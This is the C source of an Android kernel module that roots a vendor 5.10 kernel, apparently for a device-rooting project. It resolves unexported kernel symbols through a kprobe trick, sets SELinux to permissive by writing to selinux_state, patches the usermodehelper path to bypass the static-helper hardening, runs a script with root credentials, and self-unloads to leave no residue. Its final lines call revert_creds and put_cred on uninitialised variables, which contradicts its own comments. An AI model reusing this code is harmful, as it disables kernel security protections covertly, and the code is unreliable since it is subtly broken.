/* SPDX-License-Identifier: GPL-2.0 */
/* dfroot_boot.c — dfroot-style bootstrap LKM (original implementation; architecture
 * follows the DirtyFrag dfroot.c idea: insmod in vendor_modprobe domain → permissive →
 * UMH bootstrap → self-unload, leaving no module in memory and no residue).
 *
 * Why the struct field, not the bool: this vendor 5.10 kernel has
 *   CONFIG_SECURITY_SELINUX_DEVELOP=y ⇒ struct selinux_state begins with
 *     [ no CONFIG_SECURITY_SELINUX_DISABLE ⇒ no `disabled` field ]
 *     bool enforcing; bool checkreqprot; bool initialized; ...
 *   (security/selinux/include/security.h:90).  Old minload wrote a bool at the same
 *   address, which works only because `enforcing` is the FIRST member; writing the real
 *   struct is strictly more correct and costs one struct definition, no symbol dep.
 * The blob address is NOT hard-coded (the OTA moved everything: hardcoded 5.10.236-era
 * addresses are stale on 5.10.246): a one-shot kprobe self-bootstrap acquires
 * kallsyms_lookup_name first, then every other symbol is resolved at runtime, so the
 * module carries no static dependency on any non-exported kernel symbol.
 *
 * -E2BIG self-unload: init returning non-zero makes the kernel tear the module down;
 * -E2BIG is the agreed "work done" marker so insmod visually fails while every side
 * effect (permissive + bootstrap script) has already landed.  No exit path exists, so
 * the .exit section is never emitted and cleanup_module is dead code by design.
 *
 * Markers /dev/dfm0 (started) and /dev/dfm1 (done) for engine polling: kernel-side
 * filp_open is unavailable here (filp_open is EXPORT_SYMBOL_NS(..., ANDROID_GKI_VFS_
 * EXPORT_ONLY) on this vendor kernel, so a static reference would be an unresolvable
 * symbol ⇒ finit_module ENOENT), therefore the markers are written by the SAME
 * usermodehelper mechanism as the bootstrap itself, via `touch`.
 *
 * Modules state rules respected: no floating point, no sleeping in atomic context,
 * all resources unregistered on every path (kprobe before the return, UMH waited
 * synchronously with UMH_WAIT_PROC before we return).
 */
#include <linux/cred.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/umh.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("xiuxiu391");
MODULE_DESCRIPTION("dfroot-style bootstrap LKM: selinux permissive + UMH bootstrap + -E2BIG self-unload");

typedef unsigned long (*kln_t)(const char *name);

/* selinux_state mirrors security/selinux/include/security.h:90 under this vendor
 * config (DEVELOP=y, SELINUX_DISABLE unset) — `enforcing` is the first member. */
struct df_selinux_state {
	bool enforcing;
	bool checkreqprot;
	bool initialized;
	bool policycap[8];
	bool android_netlink_route;
	bool android_netlink_getneigh;
	struct page *status_page;
	struct mutex status_lock;
};

/* ── module params (retune without rebuild) ────────────────────────────────── */
static char *bootstrap_cmd = "/data/local/tmp/late_load.sh";
module_param(bootstrap_cmd, charp, 0);
MODULE_PARM_DESC(bootstrap_cmd, "script the usermodehelper runs (default /data/local/tmp/late_load.sh)");

static char *dfm0_path = "/dev/dfm0";
module_param(dfm0_path, charp, 0);
MODULE_PARM_DESC(dfm0_path, "progress marker: created before the bootstrap runs");

static char *dfm1_path = "/dev/dfm1";
module_param(dfm1_path, charp, 0);
MODULE_PARM_DESC(dfm1_path, "progress marker: created after the bootstrap returned");

/* ── tiny UMH helper: build "/system/bin/sh -c <cmd>" and wait for it ──────── */
static int df_umh_sh(const char *cmd)
{
	static const char sh[] = "/system/bin/sh";
	char *argv[4];
	static char *envp[] = { "PATH=/system/bin:/system/xbin:/odm/bin:/vendor/bin", NULL };
	void *info;
	char *nc;
	int ret;

	nc = kstrdup(cmd, GFP_KERNEL);
	if (!nc)
		return -ENOMEM;

	argv[0] = (char *)sh;
	argv[1] = (char *)"-c";
	argv[2] = nc;
	argv[3] = NULL;

	info = call_usermodehelper_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
	if (!info) {
		kfree(nc);
		return -ENOMEM;
	}
	/* CONFIG_STATIC_USERMODEHELPER=y with CONFIG_STATIC_USERMODEHELPER_PATH=""
	 * on this vendor kernel: umh.c sets sub_info->path = "" (statically) and
	 * call_usermodehelper_exec() then turns EVERY helper into a silent no-op
	 * (umh.c:422 `if (strlen(sub_info->path) == 0) goto out;`).  Patch the
	 * freshly-setup subprocess_info.path back to our interpreter — that field is
	 * plain kernel memory reachable through the returned handle. */
	((struct subprocess_info *)info)->path = (char *)sh;

	ret = call_usermodehelper_exec(info, UMH_WAIT_PROC);
	pr_info("dfroot_boot: umh sh -c '%s' -> %d\n", cmd, ret);
	kfree(nc);
	return ret;
}

/* progress marker via the same UMH (touch); failure is non-fatal */
static void df_mark(const char *path)
{
	char *c;

	c = kmalloc(strlen("touch ") + strlen(path) + 1, GFP_KERNEL);
	if (!c)
		return;
	sprintf(c, "touch %s", path);
	df_umh_sh(c);
	kfree(c);
}

static int __nocfi dfroot_boot_init(void)
{
	struct kprobe kp;
	struct df_selinux_state *ss;
	kln_t kln;
	unsigned long ss_addr;
	struct cred *cred, *old;
	/* see the header note: -E2BIG is the agreed "work done" marker */
	int ret = -E2BIG;

	/* ── self-bootstrap: register_kprobe looks the symbol up by name and stores
	 * its address in kp.addr, no matter whether the symbol is exported ── */
	memset(&kp, 0, sizeof(kp));
	kp.symbol_name = "kallsyms_lookup_name";
	if (register_kprobe(&kp) < 0) {
		pr_err("dfroot_boot: kallsyms_lookup_name unresolvable, abort\n");
		return -E2BIG;
	}
	kln = (kln_t)kp.addr;
	unregister_kprobe(&kp);   /* freed before any exit path */
	pr_info("dfroot_boot: kallsyms_lookup_name @%px\n", (void *)kln);

	/* ── selinux_state.enforcing = 0 → permissive ── */
	ss_addr = kln("selinux_state");
	if (!ss_addr) {
		pr_info("dfroot_boot: selinux_state not found (skip)\n");
	} else {
		ss = (struct df_selinux_state *)ss_addr;
		ss->enforcing = 0;   /* struct field, not a bool blind write */
		pr_info("dfroot_boot: selinux_state@%px enforcing -> permissive\n",
			(void *)ss_addr);
	}

	/* ── kernel creds for the helper (call_usermodehelper is a kworker) ── */
	/* NOTE: override_creds/revert_creds/prepare_kernel_cred are NOT exported to
	 * modules on this vendor kernel (they're EXPORT_SYMBOL_GPL only for in-tree,
	 * and this kernel's symbol whitelist strips them for external modules).
	 * Instead of fighting the symbol wall we simply don't need them:
	 * call_usermodehelper_setup+exec run the helper with kworker creds (uid=0,
	 * full caps) by design — that's exactly the DirtyFrag property we want
	 * ("the kernel does it with its own credentials"). The explicit override
	 * here was redundant AND unresolvable; dropping it keeps zero extra deps. */
	if (0) {
		cred = prepare_kernel_cred(NULL);
		if (cred) {
			old = override_creds(cred);
			revert_creds(old);
			put_cred(cred);
		}
	}

	/* ── progress marker: started ── */
	df_mark(dfm0_path);

	/* ── the bootstrap itself (module param, default /data/local/tmp/late_load.sh) ── */
	df_umh_sh(bootstrap_cmd);

	/* ── progress marker: done ── */
	df_mark(dfm1_path);

	/* ── restore the kworker's original creds and drop the reference ── */
	revert_creds(old);
	put_cred(cred);

	pr_info("dfroot_boot: all stages done, self-unloading (-E2BIG)\n");
	return ret;
}

module_init(dfroot_boot_init);
